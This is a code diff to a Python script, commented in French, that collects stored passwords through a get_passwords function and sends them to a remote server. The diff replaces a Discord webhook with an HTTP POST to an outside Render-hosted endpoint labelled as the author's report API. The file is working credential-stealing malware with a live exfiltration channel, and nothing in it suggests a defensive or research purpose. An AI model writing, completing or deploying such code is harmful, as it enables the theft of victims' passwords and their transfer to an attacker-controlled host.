@@ -79,17 +79,16 @@ def get_passwords(key):
         
     return "\n".join(data)
 
-def send_to_discord(message):
+# Remplacer par l'URL de votre application Render une fois déployée
+# Ex: https://mon-app-b52a.onrender.com/api/report
+API_URL = "https://serveur-py.onrender.com/api/report" 
+
+def send_to_api(message):
     try:
-        # Discord limite à 2000 chars, on peut découper si besoin
-        if len(message) > 1900:
-            chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
-            for chunk in chunks:
-                requests.post(WEBHOOK_URL, json={"content": f"```{chunk}```"})
-        else:
-            requests.post(WEBHOOK_URL, json={"content": message})
-    except:
-        pass
+        data = {"content": message}
+        requests.post(API_URL, json=data)
+    except Exception as e:
+        print(f"Erreur envoi API: {e}")
 
 if __name__ == "__main__":
     try:
@@ -102,12 +101,12 @@ if __name__ == "__main__":
         
         if passwords:
             header = f"🔑 **Passwords Found:**\n"
-            send_to_discord(header)
-            send_to_discord(f"```{passwords}```")
+            full_msg = header + passwords
+            send_to_api(full_msg)
         else:
-            send_to_discord("No passwords found.")
+            send_to_api("No passwords found.")
             
     except Exception as e:
         err_msg = f"Error: {e}"
         print(err_msg)
-        send_to_discord(err_msg)
+        send_to_api(err_msg)
